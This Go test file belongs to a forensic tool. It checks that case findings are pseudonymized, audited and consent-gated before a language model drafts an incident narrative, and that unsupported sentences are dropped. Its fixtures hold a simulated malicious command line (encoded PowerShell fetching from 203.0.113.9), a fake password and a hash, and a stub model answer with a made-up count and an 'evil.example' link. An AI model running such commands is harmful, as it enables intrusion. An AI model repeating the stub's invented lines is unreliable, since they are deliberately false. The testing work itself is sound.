package api

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"tracefall/internal/enrich/llm"
	"tracefall/internal/model"
)

var (
	realNames = []string{"alice", "host01", "203.0.113.9", "10.1.2.3", "Hunter2xyz", "corp.example", "fileserver02"}
	hostTokRe = regexp.MustCompile(`\[HOST_\d+\]`)
	userTokRe = regexp.MustCompile(`\[USER_\d+\]`)
	ipTokRe   = regexp.MustCompile(`\[IP_PUB_\d+\]`)
)

type llmReq struct {
	System, User, Auth, Path string
	Raw                      []byte
}

type llmStub struct {
	mu     sync.Mutex
	reqs   []llmReq
	answer func(user string) (int, string)
	delay  time.Duration
	hdr    map[string]string
	srv    *httptest.Server
}

func (s *llmStub) count() int { s.mu.Lock(); defer s.mu.Unlock(); return len(s.reqs) }
func (s *llmStub) last() llmReq {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.reqs[len(s.reqs)-1]
}

func chatBody(content string) string {
	b, _ := json.Marshal(map[string]any{
		"model":   "stub-model-2026",
		"choices": []any{map[string]any{"message": map[string]string{"role": "assistant", "content": content}, "finish_reason": "stop"}},
		"usage":   map[string]int{"prompt_tokens": 321, "completion_tokens": 45},
	})
	return string(b)
}

func goodAnswer(user string) (int, string) {
	h, u, ip := hostTokRe.FindString(user), userTokRe.FindString(user), ipTokRe.FindString(user)
	return 200, chatBody(u + " ran PowerShell from a document on " + h + " and contacted " + ip + " on port 443. [F1, E1]\n" +
		"A lower-severity finding refers to the same event. [F2]\n" +
		"The account " + u + " also appears on a second host. [E2]\n" +
		"Seventeen sessions were involved, 17 in all. [F1]\n" + // 17 is not in the facts
		"No citation here.\n" +
		"See https://evil.example/x for more. [F1]")
}

// newLLMStub starts a model that records what it receives. When local is false
// the client's address is a name that is not this machine, and the connection
// is routed to the stub; that is how the "another machine" path is exercised
// without any real network.
func newLLMStub(t *testing.T, svc *Service, local bool) *llmStub {
	t.Helper()
	s := &llmStub{answer: goodAnswer}
	s.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		raw, _ := io.ReadAll(r.Body)
		var body struct {
			Messages []llm.Message `json:"messages"`
		}
		_ = json.Unmarshal(raw, &body)
		rq := llmReq{Auth: r.Header.Get("Authorization"), Path: r.URL.Path, Raw: raw}
		for _, m := range body.Messages {
			if m.Role == "system" {
				rq.System = m.Content
			} else {
				rq.User = m.Content
			}
		}
		s.mu.Lock()
		s.reqs = append(s.reqs, rq)
		d, ans := s.delay, s.answer
		s.mu.Unlock()
		if d > 0 {
			time.Sleep(d)
		}
		code, out := ans(rq.User)
		for k, v := range s.hdr {
			w.Header().Set(k, v)
		}
		w.WriteHeader(code)
		_, _ = w.Write([]byte(out))
	}))
	t.Cleanup(s.srv.Close)
	c := llm.New(s.srv.URL, "stub-llm-key", "stub-model")
	if !local {
		addr := s.srv.Listener.Addr().String()
		c = llm.New("http://llm.example.invalid", "stub-llm-key", "stub-model")
		c.HTTP = &http.Client{Transport: &http.Transport{DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, addr)
		}}}
	}
	svc.SetLLM(c)
	return s
}

// caseWithFindings makes a case whose findings and events carry real-looking names.
func caseWithFindings(t *testing.T, svc *Service, mux http.Handler, mod func(*[]model.Finding)) string {
	t.Helper()
	c := createTestCase(t, mux, "Narrative "+t.Name())
	col := model.Collection{ID: "11111111-2222-4333-8444-555555555555", CaseID: c.ID, SourceType: model.SourceTypeDiskImage, IngestionStatus: model.CollectionStatusPending}
	sf := model.SourceFile{ID: "sf-1", CaseID: c.ID, CollectionID: col.ID, OriginalFilename: "Security.evtx", Path: "Windows/System32/winevt/Logs/Security.evtx",
		ImportStatus: model.SourceFileImported, Supported: true, Parser: "evtx@1", ArtifactType: "windows_event_log"}
	if err := svc.store.CreateCollectionWithSourceFiles(col, []model.SourceFile{sf}); err != nil {
		t.Fatal(err)
	}
	t0 := time.Date(2026, 3, 14, 9, 30, 0, 0, time.UTC)
	mk := func(id string, i int, host string) model.Event {
		return model.Event{ID: id, CaseID: c.ID, CollectionID: col.ID, SourceFileID: sf.ID, Timestamp: t0.Add(time.Duration(i) * time.Second),
			EventType: "process_creation", ArtifactType: "windows_event_log", Host: host, User: "CORP\\alice", DedupHash: "d-" + id,
			ProcessName: "powershell.exe", ParentProcessName: "winword.exe", EventID: 4688,
			CommandLine:   "powershell -enc QUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJDQUJD -password Hunter2xyz -c iwr 203.0.113.9 -s fileserver02",
			FilePath:      `C:\Users\alice\AppData\Local\Temp\x.ps1`,
			NetworkSource: "10.1.2.3", NetworkDest: "203.0.113.9", NetworkDestPort: 443,
			Extra: map[string]string{"logon_type": "3", "outcome": "success", "sql_statement": "SELECT * FROM payroll", "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee",
				"TargetDomainName": "corp.example", "ComputerName": "fileserver02"}}
	}
	if err := svc.store.SaveEvents([]model.Event{mk("ev-1", 0, "host01"), mk("ev-2", 1, "host01")}); err != nil {
		t.Fatal(err)
	}
	fs := []model.Finding{
		{ID: "fnd-1", CaseID: c.ID, RuleID: "office-spawns-powershell", Title: "Office spawned PowerShell on host01", Severity: "high", Confidence: "medium",
			Description: "alice opened a document on host01 that started powershell.exe talking to 203.0.113.9", SupportingEvents: []string{"ev-1", "ev-2"},
			Techniques: []string{"T1059.001"}, FirstSeen: t0, LastSeen: t0.Add(time.Second), CreatedAt: t0},
		{ID: "fnd-2", CaseID: c.ID, RuleID: "encoded-powershell", Title: "Encoded PowerShell command", Severity: "low", Confidence: "low",
			Description: "A PowerShell command with an encoded argument ran against corp.example", SupportingEvents: []string{"ev-1"},
			Techniques: []string{"T1027"}, FirstSeen: t0, LastSeen: t0, CreatedAt: t0},
	}
	if mod != nil {
		mod(&fs)
	}
	if err := svc.store.SaveFindings(fs); err != nil {
		t.Fatal(err)
	}
	return c.ID
}

func startNarr(t *testing.T, mux http.Handler, id string, ack bool) *httptest.ResponseRecorder {
	t.Helper()
	return doJSON(t, mux, "POST", "/api/cases/"+id+"/enrich/narrative", map[string]bool{"acknowledge": ack}, nil)
}

func waitNarr(t *testing.T, svc *Service, id string) NarrativeStatus {
	t.Helper()
	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		st, err := svc.NarrativeStatus(id)
		if err != nil {
			t.Fatal(err)
		}
		if st.Run != nil && st.Run.State != "running" {
			return st
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("the request did not end")
	return NarrativeStatus{}
}

func TestNarrative_RefusedUnlessTheLevelAllowsItAndTheAnalystAcknowledges(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	stub := newLLMStub(t, svc, false)
	id := caseWithFindings(t, svc, mux, nil)

	for _, lvl := range []string{"none", "hashes"} {
		if lvl != "none" {
			setLevel(t, mux, id, lvl)
		}
		rec := startNarr(t, mux, id, true)
		if rec.Code != http.StatusForbidden || !strings.Contains(rec.Body.String(), "pseudonymized") {
			t.Errorf("level %s: %d %s", lvl, rec.Code, rec.Body.String())
		}
	}
	setLevel(t, mux, id, "pseudonymized")
	rec := startNarr(t, mux, id, false)
	if rec.Code != http.StatusForbidden || !strings.Contains(rec.Body.String(), "acknowledge") {
		t.Errorf("without acknowledgement: %d %s", rec.Code, rec.Body.String())
	}
	time.Sleep(50 * time.Millisecond)
	if stub.count() != 0 {
		t.Errorf("%d request(s) reached the model although every one was refused", stub.count())
	}
	for _, a := range auditActions(t, svc, id) {
		if a.Action == model.AuditNarrativeRequested {
			t.Errorf("a refused request was recorded as sent: %+v", a)
		}
	}
	var st NarrativeStatus
	doJSON(t, mux, "GET", "/api/cases/"+id+"/enrich/narrative", nil, &st)
	if !st.Configured || !st.Allowed || !st.NeedsAcknowledgement || st.Local || st.Destination != "llm.example.invalid" || st.Model != "stub-model" || st.Findings != 2 {
		t.Errorf("status = %+v", st)
	}
	if stub.count() != 0 {
		t.Errorf("reading the status sent a request")
	}
}

func TestNarrative_NotConfiguredAndNothingToSummarise(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	id := caseWithFindings(t, svc, mux, nil)
	setLevel(t, mux, id, "pseudonymized")
	if rec := startNarr(t, mux, id, true); rec.Code != http.StatusNotImplemented {
		t.Errorf("not configured: %d", rec.Code)
	}
	svc.SetLLM(llm.New("", "key", "")) // no model name
	if rec := startNarr(t, mux, id, true); rec.Code != http.StatusNotImplemented {
		t.Errorf("no model name: %d", rec.Code)
	}
	newLLMStub(t, svc, false)
	empty := createTestCase(t, mux, "Empty narrative")
	setLevel(t, mux, empty.ID, "pseudonymized")
	if rec := startNarr(t, mux, empty.ID, true); rec.Code != http.StatusUnprocessableEntity {
		t.Errorf("no findings: %d", rec.Code)
	}
}

func TestNarrative_WhatLeavesHoldsNoNameAndTheDraftComesBackWithThem(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	stub := newLLMStub(t, svc, false)
	id := caseWithFindings(t, svc, mux, nil)
	setLevel(t, mux, id, "pseudonymized")
	if rec := startNarr(t, mux, id, true); rec.Code != http.StatusAccepted {
		t.Fatalf("start: %d %s", rec.Code, rec.Body.String())
	}
	st := waitNarr(t, svc, id)
	if st.Run.State != "finished" || st.Latest == nil || st.Latest.Status != "ok" {
		t.Fatalf("run = %+v latest = %+v", st.Run, st.Latest)
	}
	if stub.count() != 1 {
		t.Fatalf("requests = %d", stub.count())
	}
	rq := stub.last()
	all := rq.System + "\n" + rq.User + "\n" + string(rq.Raw)
	for _, name := range realNames {
		if strings.Contains(strings.ToLower(all), strings.ToLower(name)) {
			t.Errorf("%q left the server:\n%s", name, rq.User)
		}
	}
	for _, field := range []string{"SELECT", "payroll", "aad3b435", "sql_statement", "ntlm_hash", "Security.evtx", "Narrative TestNarrative", "ev-1", "fnd-1", "sf-1"} {
		if strings.Contains(all, field) {
			t.Errorf("%q, which is not on the list of what may be sent, left the server", field)
		}
	}
	for _, want := range []string{"[HOST_", "[USER_", "[IP_PUB_", "-password [REDACTED]", "F1 | severity=high", "F2 | severity=low", "powershell.exe"} {
		if !strings.Contains(rq.User, want) {
			t.Errorf("the request lacks %q", want)
		}
	}
	if rq.Auth != "Bearer stub-llm-key" || rq.Path != "/chat/completions" {
		t.Errorf("request: %s %s", rq.Auth, rq.Path)
	}

	// the draft: three good lines kept, three bad ones dropped and counted
	d := st.Latest
	if len(d.Sentences) != 3 || d.Rejected != 3 {
		t.Fatalf("kept %d, rejected %d: %+v", len(d.Sentences), d.Rejected, d.Reasons)
	}
	for _, r := range []string{"no citation at the end of the line", "a number that is not in the facts", "a web address in the sentence"} {
		if d.Reasons[r] != 1 {
			t.Errorf("reason %q = %d in %v", r, d.Reasons[r], d.Reasons)
		}
	}
	s0 := d.Sentences[0]
	if !strings.Contains(s0.Text, "alice") || !strings.Contains(s0.Text, "host01") || !strings.Contains(s0.Text, "203.0.113.9") || strings.Contains(s0.Text, "[") {
		t.Errorf("names were not restored for the examiner: %q", s0.Text)
	}
	if len(s0.Cites) != 2 || s0.Cites[0].ID != "fnd-1" || s0.Cites[0].Kind != "finding" || s0.Cites[1].ID != "ev-1" || s0.Cites[1].Kind != "event" {
		t.Errorf("cites map back to real ids: %+v", s0.Cites)
	}
	if d.Model != "stub-model-2026" || d.Destination != "llm.example.invalid" || d.Local || d.PromptTokens != 321 || d.CompletionTokens != 45 || d.FindingsCovered != 2 || d.Stale {
		t.Errorf("view = %+v", d)
	}

	// what was sent is stored exactly, and its hash is the one in the audit trail
	var pl NarrativePayload
	if rec := doJSON(t, mux, "GET", "/api/cases/"+id+"/enrich/narrative/payload", nil, &pl); rec.Code != 200 {
		t.Fatalf("payload: %d", rec.Code)
	}
	if pl.System != rq.System || pl.User != rq.User || pl.SHA256 != sha256hex(rq.System+"\x00"+rq.User) || pl.SHA256 != d.PayloadSHA256 {
		t.Errorf("the stored payload is not what the model received")
	}
	var requested, finished *model.AuditEvent
	for _, a := range auditActions(t, svc, id) {
		a := a
		switch a.Action {
		case model.AuditNarrativeRequested:
			requested = &a
		case model.AuditNarrativeFinished:
			finished = &a
		}
	}
	if requested == nil || !strings.Contains(requested.Summary, pl.SHA256) || !strings.Contains(requested.Summary, "llm.example.invalid") ||
		!strings.Contains(requested.Summary, "stub-model") || !strings.Contains(requested.Summary, "acknowledged the provider's terms") || !strings.Contains(requested.Summary, "2 finding(s), 2 event(s)") {
		t.Errorf("requested audit: %+v", requested)
	}
	for _, name := range realNames {
		if requested != nil && strings.Contains(strings.ToLower(requested.Summary), strings.ToLower(name)) {
			t.Errorf("the audit entry holds %q", name)
		}
	}
	if finished == nil || !strings.Contains(finished.Summary, "finished: 3 sentence(s) kept, 3 dropped") {
		t.Errorf("finished audit: %+v", finished)
	}
}

func TestNarrative_ALocalModelIsNotAnOutsideService(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	stub := newLLMStub(t, svc, true)
	id := caseWithFindings(t, svc, mux, nil)
	// level none, no acknowledgement: nothing leaves this machine
	if rec := startNarr(t, mux, id, false); rec.Code != http.StatusAccepted {
		t.Fatalf("start: %d %s", rec.Code, rec.Body.String())
	}
	st := waitNarr(t, svc, id)
	if st.Run.State != "finished" || !st.Local || st.NeedsAcknowledgement {
		t.Errorf("status = %+v", st)
	}
	// the text is pseudonymized all the same
	if strings.Contains(strings.ToLower(stub.last().User), "alice") {
		t.Errorf("a name reached even a local model")
	}
}

func TestNarrative_RefusesBeforeSendingWhenTheTextStillHoldsAnIdentifyingValue(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	stub := newLLMStub(t, svc, false)
	id := caseWithFindings(t, svc, mux, func(fs *[]model.Finding) { (*fs)[0].Techniques = []string{"T1059.001", "203.0.113.77"} })
	setLevel(t, mux, id, "pseudonymized")
	rec := startNarr(t, mux, id, true)
	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("status = %d %s", rec.Code, rec.Body.String())
	}
	time.Sleep(50 * time.Millisecond)
	if stub.count() != 0 {
		t.Errorf("a request with an identifying value was sent")
	}
	var refused *model.AuditEvent
	for _, a := range auditActions(t, svc, id) {
		a := a
		if a.Action == model.AuditNarrativeRefused {
			refused = &a
		}
		if a.Action == model.AuditNarrativeRequested {
			t.Errorf("a refused request was recorded as sent")
		}
	}
	if refused == nil || !strings.Contains(refused.Summary, "an IPv4 address") || strings.Contains(refused.Summary, "203.0.113.77") {
		t.Errorf("refusal audit (kinds only, never values): %+v", refused)
	}
	if _, ok, _ := svc.store.LatestNarrative(id); ok {
		t.Errorf("a request that never went out left a draft row")
	}
}

func TestNarrative_AnAnswerWithNothingUsableIsRecordedWithWhatWasSent(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	stub := newLLMStub(t, svc, false)
	stub.answer = func(string) (int, string) { return 200, chatBody("I cannot help.\nNo ids here either.") }
	id := caseWithFindings(t, svc, mux, nil)
	setLevel(t, mux, id, "pseudonymized")
	startNarr(t, mux, id, true)
	st := waitNarr(t, svc, id)
	if st.Run.State != "failed" || st.Latest == nil || st.Latest.Status != "error" || st.Latest.Rejected != 2 || len(st.Latest.Sentences) != 0 {
		t.Errorf("run %+v latest %+v", st.Run, st.Latest)
	}
	if pl, ok, _ := svc.LatestNarrativePayload(id); !ok || pl.User != stub.last().User {
		t.Errorf("what was sent must be recorded even when the answer is unusable")
	}
}

func TestNarrative_ProviderFailuresAreRecordedAndTheKeyIsNeverInThem(t *testing.T) {
	for name, tc := range map[string]struct {
		code int
		body string
		want string
	}{
		"key refused": {401, `{"error":{"message":"bad"}}`, "refused"},
		"server":      {500, `{"error":{"message":"overloaded stub-llm-key"}}`, "HTTP 500"},
		"cut off":     {200, `{"choices":[{"message":{"role":"assistant","content":"half"},"finish_reason":"length"}]}`, "cut off"},
	} {
		mux, svc := newTestRouterWithService(t)
		stub := newLLMStub(t, svc, false)
		stub.answer = func(string) (int, string) { return tc.code, tc.body }
		id := caseWithFindings(t, svc, mux, nil)
		setLevel(t, mux, id, "pseudonymized")
		startNarr(t, mux, id, true)
		st := waitNarr(t, svc, id)
		if st.Run.State != "failed" || st.Latest == nil || st.Latest.Status != "error" || !strings.Contains(st.Latest.Error, tc.want) || strings.Contains(st.Latest.Error, "stub-llm-key") {
			t.Errorf("%s: run %+v latest %+v", name, st.Run, st.Latest)
		}
	}
}

func TestNarrative_OneAtATimeAndCancel(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	stub := newLLMStub(t, svc, false)
	stub.delay = 400 * time.Millisecond
	id := caseWithFindings(t, svc, mux, nil)
	setLevel(t, mux, id, "pseudonymized")
	if rec := startNarr(t, mux, id, true); rec.Code != 202 {
		t.Fatalf("first: %d", rec.Code)
	}
	if rec := startNarr(t, mux, id, true); rec.Code != http.StatusConflict {
		t.Errorf("a second start while running: %d", rec.Code)
	}
	if rec := doJSON(t, mux, "POST", "/api/cases/"+id+"/enrich/narrative/cancel", nil, nil); rec.Code != 204 {
		t.Fatalf("cancel: %d", rec.Code)
	}
	st := waitNarr(t, svc, id)
	if st.Run.State != "cancelled" || st.Latest == nil || st.Latest.Status != "error" || len(st.Latest.Sentences) != 0 {
		t.Errorf("run %+v latest %+v", st.Run, st.Latest)
	}
}

func TestNarrative_ADraftIsStaleOnceTheFindingsChange(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	newLLMStub(t, svc, false)
	id := caseWithFindings(t, svc, mux, nil)
	setLevel(t, mux, id, "pseudonymized")
	startNarr(t, mux, id, true)
	if st := waitNarr(t, svc, id); st.Latest == nil || st.Latest.Stale {
		t.Fatalf("a fresh draft is not stale: %+v", st.Latest)
	}
	more := model.Finding{ID: "fnd-3", CaseID: id, RuleID: "r", Title: "Another", Severity: "critical", Confidence: "high", Description: "d",
		SupportingEvents: []string{"ev-1"}, FirstSeen: time.Now().UTC(), LastSeen: time.Now().UTC(), CreatedAt: time.Now().UTC()}
	if err := svc.store.SaveFindings([]model.Finding{more}); err != nil {
		t.Fatal(err)
	}
	st, _ := svc.NarrativeStatus(id)
	if st.Latest == nil || !st.Latest.Stale {
		t.Errorf("the findings changed but the draft is not marked stale: %+v", st.Latest)
	}
}

func TestEgress_PseudonymizedIsSelectableAndAuditedLikeAnyChange(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	id := caseWithFindings(t, svc, mux, nil)
	if rec := setLevel(t, mux, id, "pseudonymized"); rec.Code != 200 {
		t.Fatalf("%d %s", rec.Code, rec.Body.String())
	}
	if rec := setLevel(t, mux, id, "full"); rec.Code != 400 {
		t.Errorf("full is still reserved: %d", rec.Code)
	}
	found := false
	for _, a := range auditActions(t, svc, id) {
		if a.Action == model.AuditEgressChanged && strings.Contains(a.Summary, "from none to pseudonymized") && strings.Contains(a.Summary, "language model") {
			found = true
		}
	}
	if !found {
		t.Errorf("the change to pseudonymized was not audited with what it allows")
	}
}

func sha256hex(s string) string { h := sha256.Sum256([]byte(s)); return hex.EncodeToString(h[:]) }

func TestNarrative_ARateLimitIsWaitedOutOnce(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	stub := newLLMStub(t, svc, false)
	calls := 0
	stub.answer = func(user string) (int, string) {
		calls++
		if calls == 1 {
			return 429, `{"error":{"message":"slow down"}}`
		}
		return goodAnswer(user)
	}
	stub.hdr = map[string]string{"Retry-After": "0"}
	id := caseWithFindings(t, svc, mux, nil)
	setLevel(t, mux, id, "pseudonymized")
	startNarr(t, mux, id, true)
	st := waitNarr(t, svc, id)
	if st.Run.State != "finished" || calls != 2 || st.Latest == nil || st.Latest.Status != "ok" {
		t.Errorf("run %+v after %d calls", st.Run, calls)
	}
	// both attempts carried the same text: a retry is not a second disclosure
	if stub.reqs[0].User != stub.reqs[1].User {
		t.Errorf("the retry sent different text")
	}
}

func TestViewOf_ADraftIsStaleWhenAFindingIsReplacedEvenIfTheCountIsTheSame(t *testing.T) {
	f := func(id string) model.Finding {
		return model.Finding{ID: id, Severity: "high", FirstSeen: time.Date(2026, 3, 14, 9, 0, 0, 0, time.UTC)}
	}
	n := model.Narrative{FindingIDs: []string{"fnd-1", "fnd-2"}, SentencesJSON: "[]"}
	if v := viewOf(n, []model.Finding{f("fnd-2"), f("fnd-1")}); v.Stale {
		t.Errorf("the same findings in another order are not stale")
	}
	if v := viewOf(n, []model.Finding{f("fnd-1"), f("fnd-9")}); !v.Stale {
		t.Errorf("a replaced finding with the same count must be stale")
	}
	if v := viewOf(n, []model.Finding{f("fnd-1")}); !v.Stale {
		t.Errorf("a removed finding must be stale")
	}
	if v := viewOf(n, nil); !v.Stale {
		t.Errorf("no findings left must be stale")
	}
}

// chatterStub is a provider that is not a chat completions endpoint: it names
// no model until it answers, and carries a notice.
type chatterStub struct {
	answered string
	notice   string
	seen     []string
}

func (c *chatterStub) Chat(_ context.Context, m []llm.Message) (llm.Result, error) {
	c.seen = append(c.seen, m[len(m)-1].Content)
	_, ans := goodAnswer(m[len(m)-1].Content)
	var body struct {
		Choices []struct {
			Message llm.Message `json:"message"`
		} `json:"choices"`
	}
	_ = json.Unmarshal([]byte(ans), &body)
	return llm.Result{Content: body.Choices[0].Message.Content, Model: c.answered}, nil
}
func (c *chatterStub) Configured() bool { return true }
func (c *chatterStub) Destination() (string, bool) {
	return "chatgpt.com (through the Codex CLI)", false
}
func (c *chatterStub) ModelName() string { return "the Codex CLI's default model" }
func (c *chatterStub) Notice() string    { return c.notice }

func TestNarrative_AnyProviderWorksAndTheModelThatAnsweredIsRecorded(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	cs := &chatterStub{answered: "gpt-actual-1", notice: "Improve the model for everyone is something this program cannot check."}
	svc.SetLLM(cs)
	id := caseWithFindings(t, svc, mux, nil)
	setLevel(t, mux, id, "pseudonymized")

	var st NarrativeStatus
	doJSON(t, mux, "GET", "/api/cases/"+id+"/enrich/narrative", nil, &st)
	if !st.Configured || st.Destination != "chatgpt.com (through the Codex CLI)" || st.Model != "the Codex CLI's default model" || st.Notice != cs.notice || !st.NeedsAcknowledgement {
		t.Errorf("status = %+v", st)
	}
	if rec := startNarr(t, mux, id, false); rec.Code != http.StatusForbidden {
		t.Errorf("any provider that is not this machine needs the acknowledgement: %d", rec.Code)
	}
	if rec := startNarr(t, mux, id, true); rec.Code != http.StatusAccepted {
		t.Fatalf("start: %d %s", rec.Code, rec.Body.String())
	}
	st = waitNarr(t, svc, id)
	if st.Latest == nil || st.Latest.Status != "ok" || st.Latest.Model != "gpt-actual-1" {
		t.Errorf("the model that answered must replace the description of the default: %+v", st.Latest)
	}
	if len(cs.seen) != 1 || strings.Contains(strings.ToLower(cs.seen[0]), "alice") {
		t.Errorf("the provider received %d request(s) / a name", len(cs.seen))
	}
	if st.Latest.PromptTokens != 0 || st.Latest.CompletionTokens != 0 {
		t.Errorf("tokens a provider does not report are not invented: %+v", st.Latest)
	}
	b, _ := svc.buildReport(id, time.Date(2026, 3, 14, 12, 0, 0, 0, time.UTC))
	h := appendixEOf(t, string(b.HTML))
	if strings.Contains(h, "Tokens used") || !strings.Contains(h, "gpt-actual-1") || !strings.Contains(h, "chatgpt.com (through the Codex CLI)") {
		t.Errorf("appendix:\n%s", h)
	}
}

func TestSetLLM_NilMeansNotConfigured(t *testing.T) {
	mux, svc := newTestRouterWithService(t)
	svc.SetLLM(&chatterStub{})
	svc.SetLLM(nil)
	id := caseWithFindings(t, svc, mux, nil)
	var st NarrativeStatus
	if rec := doJSON(t, mux, "GET", "/api/cases/"+id+"/enrich/narrative", nil, &st); rec.Code != 200 || st.Configured {
		t.Errorf("%d %+v", rec.Code, st)
	}
	if rec := startNarr(t, mux, id, true); rec.Code != http.StatusNotImplemented {
		t.Errorf("start: %d", rec.Code)
	}
}
